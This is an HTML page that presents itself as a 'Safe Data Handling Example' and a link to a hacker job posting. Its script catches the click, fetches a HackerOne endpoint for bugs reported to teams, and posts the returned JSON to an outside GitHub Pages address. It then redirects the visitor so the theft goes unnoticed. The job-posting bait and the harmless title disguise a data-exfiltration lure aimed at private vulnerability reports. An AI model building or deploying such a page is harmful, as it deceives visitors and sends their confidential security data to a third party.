<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safe Data Handling Example</title>
</head>
<body>
    <h1>Click Below to View Job Posting</h1>
    <a href="https://hackerone.com/bugs/reported_to_teams/?response.json" id="jobLink" target="_blank">View Hacker Job</a>

    <script>
        document.getElementById('jobLink').addEventListener('click', async (event) => {
            event.preventDefault(); // Prevents immediate navigation to link
            const url = event.target.href;

            try {
                // Fetch data only if allowed by CORS (for demonstration)
                const response = await fetch(url);
                const data = await response.json(); // Assume JSON format for demo

                // Send data to your server
                await fetch('https://nigam498.github.io/Hackerone/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ data })
                });

                // Navigate to the original link
                window.location.href = url;
            } catch (error) {
                console.error('Error fetching or sending data:', error);
            }
        });
    </script>
</body>
</html>
